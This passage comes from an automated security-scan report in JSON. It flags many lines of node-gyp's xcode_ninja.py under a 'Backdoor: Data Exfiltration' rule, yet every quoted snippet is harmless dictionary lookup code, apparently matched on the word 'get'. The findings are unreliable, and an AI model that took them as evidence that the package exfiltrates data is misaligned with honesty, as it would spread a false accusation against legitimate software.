                  "endLine": 255,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    sources = []\n    for target, target_dict in target_dicts.items():\n        base = os.path.dirname(target)\n        files = target_dict.get(\"sources\", []) + target_dict.get(\n            \"mac_bundle_resources\", []\n        )\n\n",
                    "rendered": {
                      "text": "    sources = []\n    for target, target_dict in target_dicts.items():\n        base = os.path.dirname(target)\n        files = target_dict.get(\"sources\", []) + target_dict.get(\n            \"mac_bundle_resources\", []\n        )\n\n",
                      "markdown": "`    sources = []\n    for target, target_dict in target_dicts.items():\n        base = os.path.dirname(target)\n        files = target_dict.get(\"sources\", []) + target_dict.get(\n            \"mac_bundle_resources\", []\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 248,
                  "startColumn": 45,
                  "endLine": 248,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    sources_target[\"configurations\"] = {\"Default\": {\"include_dirs\": [depth]}}\n\n    # Put excluded files into the sources target so they can be opened in Xcode.\n    skip_excluded_files = not generator_flags.get(\n        \"xcode_ninja_list_excluded_files\", True\n    )\n\n",
                    "rendered": {
                      "text": "    sources_target[\"configurations\"] = {\"Default\": {\"include_dirs\": [depth]}}\n\n    # Put excluded files into the sources target so they can be opened in Xcode.\n    skip_excluded_files = not generator_flags.get(\n        \"xcode_ninja_list_excluded_files\", True\n    )\n\n",
                      "markdown": "`    sources_target[\"configurations\"] = {\"Default\": {\"include_dirs\": [depth]}}\n\n    # Put excluded files into the sources target so they can be opened in Xcode.\n    skip_excluded_files = not generator_flags.get(\n        \"xcode_ninja_list_excluded_files\", True\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 216,
                  "startColumn": 30,
                  "endLine": 216,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        spec = target_dicts[old_qualified_target]\n        if IsValidTargetForWrapper(target_extras, executable_target_pattern, spec):\n            # Add to new_target_list.\n            target_name = spec.get(\"target_name\")\n            new_target_name = f\"{main_gyp}:{target_name}#target\"\n            new_target_list.append(new_target_name)\n\n",
                    "rendered": {
                      "text": "        spec = target_dicts[old_qualified_target]\n        if IsValidTargetForWrapper(target_extras, executable_target_pattern, spec):\n            # Add to new_target_list.\n            target_name = spec.get(\"target_name\")\n            new_target_name = f\"{main_gyp}:{target_name}#target\"\n            new_target_list.append(new_target_name)\n\n",
                      "markdown": "`        spec = target_dicts[old_qualified_target]\n        if IsValidTargetForWrapper(target_extras, executable_target_pattern, spec):\n            # Add to new_target_list.\n            target_name = spec.get(\"target_name\")\n            new_target_name = f\"{main_gyp}:{target_name}#target\"\n            new_target_list.append(new_target_name)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 210,
                  "startColumn": 35,
                  "endLine": 210,
                  "endColumn": 40,
                  "snippet": {
                    "text": "\n    # For including other non-executable targets, add the matching target name\n    # to the |xcode_ninja_target_pattern| regular expression. (Default none)\n    target_extras = generator_flags.get(\"xcode_ninja_target_pattern\", None)\n\n    for old_qualified_target in target_list:\n        spec = target_dicts[old_qualified_target]\n",
                    "rendered": {
                      "text": "\n    # For including other non-executable targets, add the matching target name\n    # to the |xcode_ninja_target_pattern| regular expression. (Default none)\n    target_extras = generator_flags.get(\"xcode_ninja_target_pattern\", None)\n\n    for old_qualified_target in target_list:\n        spec = target_dicts[old_qualified_target]\n",
                      "markdown": "`\n    # For including other non-executable targets, add the matching target name\n    # to the |xcode_ninja_target_pattern| regular expression. (Default none)\n    target_extras = generator_flags.get(\"xcode_ninja_target_pattern\", None)\n\n    for old_qualified_target in target_list:\n        spec = target_dicts[old_qualified_target]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 204,
                  "startColumn": 47,
                  "endLine": 204,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    # Normally the xcode-ninja generator includes only valid executable targets.\n    # If |xcode_ninja_executable_target_pattern| is set, that list is reduced to\n    # executable targets that match the pattern. (Default all)\n    executable_target_pattern = generator_flags.get(\n        \"xcode_ninja_executable_target_pattern\", None\n    )\n\n",
                    "rendered": {
                      "text": "    # Normally the xcode-ninja generator includes only valid executable targets.\n    # If |xcode_ninja_executable_target_pattern| is set, that list is reduced to\n    # executable targets that match the pattern. (Default all)\n    executable_target_pattern = generator_flags.get(\n        \"xcode_ninja_executable_target_pattern\", None\n    )\n\n",
                      "markdown": "`    # Normally the xcode-ninja generator includes only valid executable targets.\n    # If |xcode_ninja_executable_target_pattern| is set, that list is reduced to\n    # executable targets that match the pattern. (Default all)\n    executable_target_pattern = generator_flags.get(\n        \"xcode_ninja_executable_target_pattern\", None\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 199,
                  "startColumn": 57,
                  "endLine": 199,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    new_data[main_gyp] = {}\n    new_data[main_gyp][\"included_files\"] = []\n    new_data[main_gyp][\"targets\"] = []\n    new_data[main_gyp][\"xcode_settings\"] = data[orig_gyp].get(\"xcode_settings\", {})\n\n    # Normally the xcode-ninja generator includes only valid executable targets.\n    # If |xcode_ninja_executable_target_pattern| is set, that list is reduced to\n",
                    "rendered": {
                      "text": "    new_data[main_gyp] = {}\n    new_data[main_gyp][\"included_files\"] = []\n    new_data[main_gyp][\"targets\"] = []\n    new_data[main_gyp][\"xcode_settings\"] = data[orig_gyp].get(\"xcode_settings\", {})\n\n    # Normally the xcode-ninja generator includes only valid executable targets.\n    # If |xcode_ninja_executable_target_pattern| is set, that list is reduced to\n",
                      "markdown": "`    new_data[main_gyp] = {}\n    new_data[main_gyp][\"included_files\"] = []\n    new_data[main_gyp][\"targets\"] = []\n    new_data[main_gyp][\"xcode_settings\"] = data[orig_gyp].get(\"xcode_settings\", {})\n\n    # Normally the xcode-ninja generator includes only valid executable targets.\n    # If |xcode_ninja_executable_target_pattern| is set, that list is reduced to\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 30,
                  "endLine": 185,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    # Check for custom main gyp name, otherwise use the default CHROMIUM_GYP_FILE\n    # and prepend .ninja before the .gyp extension.\n    generator_flags = params.get(\"generator_flags\", {})\n    main_gyp = generator_flags.get(\"xcode_ninja_main_gyp\", None)\n    if main_gyp is None:\n        (build_file_root, build_file_ext) = os.path.splitext(orig_gyp)\n        main_gyp = build_file_root + \".ninja\" + build_file_ext\n",
                    "rendered": {
                      "text": "    # Check for custom main gyp name, otherwise use the default CHROMIUM_GYP_FILE\n    # and prepend .ninja before the .gyp extension.\n    generator_flags = params.get(\"generator_flags\", {})\n    main_gyp = generator_flags.get(\"xcode_ninja_main_gyp\", None)\n    if main_gyp is None:\n        (build_file_root, build_file_ext) = os.path.splitext(orig_gyp)\n        main_gyp = build_file_root + \".ninja\" + build_file_ext\n",
                      "markdown": "`    # Check for custom main gyp name, otherwise use the default CHROMIUM_GYP_FILE\n    # and prepend .ninja before the .gyp extension.\n    generator_flags = params.get(\"generator_flags\", {})\n    main_gyp = generator_flags.get(\"xcode_ninja_main_gyp\", None)\n    if main_gyp is None:\n        (build_file_root, build_file_ext) = os.path.splitext(orig_gyp)\n        main_gyp = build_file_root + \".ninja\" + build_file_ext\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 184,
                  "startColumn": 28,
                  "endLine": 184,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n    # Check for custom main gyp name, otherwise use the default CHROMIUM_GYP_FILE\n    # and prepend .ninja before the .gyp extension.\n    generator_flags = params.get(\"generator_flags\", {})\n    main_gyp = generator_flags.get(\"xcode_ninja_main_gyp\", None)\n    if main_gyp is None:\n        (build_file_root, build_file_ext) = os.path.splitext(orig_gyp)\n",
                    "rendered": {
                      "text": "\n    # Check for custom main gyp name, otherwise use the default CHROMIUM_GYP_FILE\n    # and prepend .ninja before the .gyp extension.\n    generator_flags = params.get(\"generator_flags\", {})\n    main_gyp = generator_flags.get(\"xcode_ninja_main_gyp\", None)\n    if main_gyp is None:\n        (build_file_root, build_file_ext) = os.path.splitext(orig_gyp)\n",
                      "markdown": "`\n    # Check for custom main gyp name, otherwise use the default CHROMIUM_GYP_FILE\n    # and prepend .ninja before the .gyp extension.\n    generator_flags = params.get(\"generator_flags\", {})\n    main_gyp = generator_flags.get(\"xcode_ninja_main_gyp\", None)\n    if main_gyp is None:\n        (build_file_root, build_file_ext) = os.path.splitext(orig_gyp)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 155,
                  "startColumn": 16,
                  "endLine": 155,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n\n        # If there is a filter and the target does not match, exclude the target.\n",
                    "rendered": {
                      "text": "    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n\n        # If there is a filter and the target does not match, exclude the target.\n",
                      "markdown": "`    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n\n        # If there is a filter and the target does not match, exclude the target.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 154,
                  "startColumn": 12,
                  "endLine": 154,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n\n",
                    "rendered": {
                      "text": "\n    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n\n",
                      "markdown": "`\n    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 153,
                  "startColumn": 15,
                  "endLine": 153,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        return True\n\n    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n",
                    "rendered": {
                      "text": "        return True\n\n    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n",
                      "markdown": "`        return True\n\n    # Otherwise just show executable targets and xc_tests.\n    if int(spec.get(\"mac_xctest_bundle\", 0)) != 0 or (\n        spec.get(\"type\", \"\") == \"executable\"\n        and spec.get(\"product_extension\", \"\") != \"bundle\"\n    ):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 22,
                  "endLine": 147,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    executable_target_pattern: Regular expression limiting executable targets.\n    spec: Specifications for target.\n  \"\"\"\n    target_name = spec.get(\"target_name\")\n    # Always include targets matching target_extras.\n    if target_extras is not None and re.search(target_extras, target_name):\n        return True\n",
                    "rendered": {
                      "text": "    executable_target_pattern: Regular expression limiting executable targets.\n    spec: Specifications for target.\n  \"\"\"\n    target_name = spec.get(\"target_name\")\n    # Always include targets matching target_extras.\n    if target_extras is not None and re.search(target_extras, target_name):\n        return True\n",
                      "markdown": "`    executable_target_pattern: Regular expression limiting executable targets.\n    spec: Specifications for target.\n  \"\"\"\n    target_name = spec.get(\"target_name\")\n    # Always include targets matching target_extras.\n    if target_extras is not None and re.search(target_extras, target_name):\n        return True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 47,
                  "endLine": 113,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n    if ninja_toplevel:\n        ninja_target[\"actions\"] = [\n",
                    "rendered": {
                      "text": "    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n    if ninja_toplevel:\n        ninja_target[\"actions\"] = [\n",
                      "markdown": "`    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n    if ninja_toplevel:\n        ninja_target[\"actions\"] = [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 112,
                  "startColumn": 53,
                  "endLine": 112,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n    if ninja_toplevel:\n",
                    "rendered": {
                      "text": "    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n    if ninja_toplevel:\n",
                      "markdown": "`    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n    if ninja_toplevel:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 48,
                  "endLine": 111,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n",
                    "rendered": {
                      "text": "\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n",
                      "markdown": "`\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n    ninja_target[\"type\"] = old_spec[\"type\"]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 48,
                  "endLine": 110,
                  "endColumn": 53,
                  "snippet": {
                    "text": "            ] = new_xcode_settings\n\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n",
                    "rendered": {
                      "text": "            ] = new_xcode_settings\n\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n",
                      "markdown": "`            ] = new_xcode_settings\n\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n    ninja_target[\"ios_watchkit_app\"] = old_spec.get(\"ios_watchkit_app\", 0)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 109,
                  "startColumn": 41,
                  "endLine": 109,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                \"xcode_settings\"\n            ] = new_xcode_settings\n\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n",
                    "rendered": {
                      "text": "                \"xcode_settings\"\n            ] = new_xcode_settings\n\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n",
                      "markdown": "`                \"xcode_settings\"\n            ] = new_xcode_settings\n\n    ninja_target[\"mac_bundle\"] = old_spec.get(\"mac_bundle\", 0)\n    ninja_target[\"mac_xctest_bundle\"] = old_spec.get(\"mac_xctest_bundle\", 0)\n    ninja_target[\"ios_app_extension\"] = old_spec.get(\"ios_app_extension\", 0)\n    ninja_target[\"ios_watchkit_extension\"] = old_spec.get(\"ios_watchkit_extension\", 0)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 92,
                  "startColumn": 67,
                  "endLine": 92,
                  "endColumn": 72,
                  "snippet": {
                    "text": "\n    if \"configurations\" in old_spec:\n        for config in old_spec[\"configurations\"]:\n            old_xcode_settings = old_spec[\"configurations\"][config].get(\n                \"xcode_settings\", {}\n            )\n            if \"IPHONEOS_DEPLOYMENT_TARGET\" in old_xcode_settings:\n",
                    "rendered": {
                      "text": "\n    if \"configurations\" in old_spec:\n        for config in old_spec[\"configurations\"]:\n            old_xcode_settings = old_spec[\"configurations\"][config].get(\n                \"xcode_settings\", {}\n            )\n            if \"IPHONEOS_DEPLOYMENT_TARGET\" in old_xcode_settings:\n",
                      "markdown": "`\n    if \"configurations\" in old_spec:\n        for config in old_spec[\"configurations\"]:\n            old_xcode_settings = old_spec[\"configurations\"][config].get(\n                \"xcode_settings\", {}\n            )\n            if \"IPHONEOS_DEPLOYMENT_TARGET\" in old_xcode_settings:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/xcode_ninja.py"
                },
                "region": {
                  "startLine": 80,
                  "startColumn": 52,
                  "endLine": 80,
